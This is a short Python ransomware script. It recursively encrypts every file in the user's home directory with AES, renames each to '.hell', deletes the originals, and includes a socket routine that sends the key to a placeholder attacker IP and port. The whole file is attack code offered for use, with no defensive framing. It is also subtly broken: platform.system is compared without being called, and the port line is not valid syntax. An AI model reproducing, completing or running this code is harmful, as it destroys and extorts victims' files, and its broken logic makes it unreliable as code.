import os
import socket
import getpass
import platform
import hashlib
from Crypto.Cipher import AES
from Crypto.Random import get_random_bytes
from Crypto.Util.Padding import pad

# We create a socket to send the encryption key to a remote server
def send_key(key):
    host = "YOUR IP ADDRESS"
    port = YOUR PORT
    s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
    s.connect((host, port))
    s.send(key)
    print("Key sent")
    s.send(b"DONE")
    s.shutdown(2)
    s.close()

# Function to encrypt a file and removing the unencrypted one
def encrypt_file(file, key, iv):
    cipher = AES.new(key, AES.MODE_CBC, iv)
    file_name = file

    with open(file_name, 'rb') as f:
        plaintext = f.read()
    
    ciphertext = cipher.encrypt(pad(plaintext, AES.block_size))
    
    with open(file_name + ".hell", "wb") as enc_file:
        enc_file.write(iv + ciphertext)

    os.remove(file_name)

# This will go through the specified folder and encrypt all of the files, even from subfolders
def encrypt_whole(folder_path, password):
    key = hashlib.sha256(password.encode()).digest() 
    iv = get_random_bytes(16)

    for root, _, files in os.walk(folder_path):
            for file_name in files:
                file_path = os.path.join(root, file_name)                                 
                encrypt_file(file_path, key, iv)
                print(f"Encrypted: {file_path}")

# Main function
# Detects username, assembles path and calls function from above to encrypt
if __name__ == "__main__":
    username = getpass.getuser()
    path = ''
    
    if platform.system == "Windows":
        path = r'C:\Users\%s' % username
    elif platform.system == "Linux":
        path = '/home/' + username
    elif platform.system == "Darwin":
        path = '/Users/' + username
    
    encrypt_whole(path, "password")
